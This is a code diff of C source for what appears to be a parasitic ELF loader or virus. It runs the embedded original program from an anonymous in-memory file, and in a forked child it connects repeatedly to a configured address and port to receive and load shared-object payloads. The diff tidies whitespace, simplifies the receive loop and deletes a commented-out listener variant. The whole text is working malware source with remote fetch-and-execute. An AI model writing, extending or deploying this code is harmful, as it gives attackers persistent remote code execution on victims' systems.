@@ -5,8 +5,8 @@
 #include <sys/unistd.h>
 #include <dlfcn.h>
 #include <elf.h>
-#include <sys/wait.h> 
-#include <sys/socket.h> 
+#include <sys/wait.h>
+#include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
@@ -87,7 +87,7 @@ void execute_host(FILE* f, char** argv, char** envp){
   fseek(f, p_size, SEEK_SET);
   fread(host, sizeof(char), h_size, f);
   int fd = memfd_create("", 1);
-  write(fd, host, h_size);  
+  write(fd, host, h_size);
   pid_t pid;
   if((pid = fork()) == 0){
     downloader();
@@ -114,63 +114,30 @@ void load_so(int connection_fd, int size){
 }
 
 void process_connection(int connection_fd){
-  while(1){
-    char buff[13];
-    if(recv(connection_fd, buff, sizeof(buff), 0) != 13){
-      // execution may never get past this block
-      continue;
-    }
-    int size = atoi(buff);
-    printf("%d\n", size);
-    load_so(connection_fd, size);
-  }
+  char buff[13];
+  read(connection_fd, buff, sizeof(buff));
+  int size = atoi(buff);
+  load_so(connection_fd, size);
 }
 
 void downloader(){
   int socket_fd;
   int connection_fd = -1;
   pid_t pid;
-  struct sockaddr_in server;  
+  struct sockaddr_in server;
   
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
   server.sin_port = htons(port);
   server.sin_addr.s_addr = inet_addr(addr);
 
-    while(connection_fd < 0){
-      sleep(5);
-      connection_fd = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
-    }
+  while(connection_fd < 0){
+    sleep(5);
+    connection_fd = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+  }
+
+  process_connection(socket_fd);
     
-    //if((pid = fork()) == 0){
-      process_connection(connection_fd);
-      //}else{
-      //wait(NULL);
-      close(connection_fd);
-      close(socket_fd);
-      //}
-      sleep(100);
-  
-  /* int socket_fd, connection_fd, addr_len;  */
-  /* struct sockaddr_in server_addr, client;  */
-  /* socket_fd = socket(AF_INET, SOCK_STREAM, 0); */
-  /* memset(&server_addr, 0, sizeof(server_addr)); */
-  /* server_addr.sin_family = AF_INET;  */
-  /* server_addr.sin_addr.s_addr = htonl(INADDR_ANY);  */
-  /* server_addr.sin_port = htons(port); */
-  /* bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)); */
-  /* listen(socket_fd, 5); */
-  /* addr_len = sizeof(client); */
-  /* while(1){ */
-  /*   connection_fd = accept(socket_fd, (struct sockaddr*)&client, &addr_len); */
-  /*   if(connection_fd > 0){ */
-  /*     pid_t pid; */
-  /*     if((pid = fork()) == 0){ */
-  /* 	process_connection(connection_fd); */
-  /*     }else{ */
-  /* 	wait(NULL); */
-  /* 	close(connection_fd); */
-  /*     } */
-  /*   } */
-  /* } */
+  close(connection_fd);
+  close(socket_fd);
 }
